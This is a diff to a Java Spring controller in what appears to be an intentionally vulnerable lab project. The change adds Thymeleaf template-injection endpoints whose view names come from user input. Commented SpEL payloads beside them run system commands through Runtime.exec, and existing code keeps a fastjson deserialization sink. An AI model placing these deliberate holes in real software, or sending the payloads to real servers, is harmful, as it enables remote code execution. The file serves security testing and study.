@@ -1,6 +1,10 @@
 package controller;
 
 import com.alibaba.fastjson.JSONObject;
+import lombok.extern.slf4j.Slf4j;
+import org.slf4j.Logger;
+import org.slf4j.LoggerFactory;
+import org.springframework.ui.Model;
 import org.springframework.web.bind.annotation.*;
 import javax.servlet.ServletInputStream;
 import javax.servlet.ServletOutputStream;
@@ -18,9 +22,10 @@ import javax.servlet.http.HttpServletResponse;
 **/
 
 
-
+@Slf4j
 @RestController
 public class TestController extends HttpServlet {
+    Logger log = LoggerFactory.getLogger(TestController.class);
 /****************************************************fastjson反序列化漏洞**********************************************************************/
     /**
      * 启动rmi服务：java -jar RogueJndi-1.0.jar -n 起服务的ip -c 要执行的命令
@@ -31,6 +36,51 @@ public class TestController extends HttpServlet {
     public String persist(@RequestBody String dataStr) {
         JSONObject data = JSONObject.parseObject(dataStr);
         return dataStr;
+    }
+    /****************************************************spring boot Thymeleaf模板注入****************************************************************
+     * https://novysodope.github.io/2020/10/10/31/
+     * ***/
+    @GetMapping("/test2")
+    public String index(Model model) {
+        model.addAttribute("message", "happy birthday");
+        return "welcome";
+    }
+
+    //GET /path?lang=en HTTP/1.1
+    //GET /path?lang=__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22id%22).getInputStream()).next()%7d__::.x
+    ///path?lang=__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).next()}__::.x
+    @GetMapping("/path")
+    public String path(@RequestParam String lang) {
+        return "user/" + lang + "/welcome"; //template path is tainted
+    }
+
+    //GET /fragment?section=main
+    //GET /fragment?section=__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22touch%20executed%22).getInputStream()).next()%7d__::.x
+    @GetMapping("/fragment")
+    public String fragment(@RequestParam String section) {
+        return "welcome :: " + section; //fragment is tainted
+    }
+///doc/__${T(java.lang.Runtime).getRuntime().exec("touch executed")}__::.x
+    @GetMapping("/doc/{document}")
+    public void getDocument(@PathVariable String document) {
+        log.info("Retrieving " + document);
+        //returns void, so view name is taken from URI
+    }
+
+    @GetMapping("/safe/fragment")
+    @ResponseBody
+    public String safeFragment(@RequestParam String section) {
+        return "welcome :: " + section; //FP, as @ResponseBody annotation tells Spring to process the return values as body, instead of view name
+    }
+
+    @GetMapping("/safe/redirect")
+    public String redirect(@RequestParam String url) {
+        return "redirect:" + url; //FP as redirects are not resolved as expressions
+    }
+
+    @GetMapping("/safe/doc/{document}")
+    public void getDocument(@PathVariable String document, HttpServletResponse response) {
+        log.info("Retrieving " + document); //FP
     }
 /*************************************************原生反序列化漏洞************************************************************************/
     /**
@@ -131,3 +181,4 @@ public class TestController extends HttpServlet {
         System.out.println("Axis CVE-2019-0227 远程命令执行");
 }
 }
+
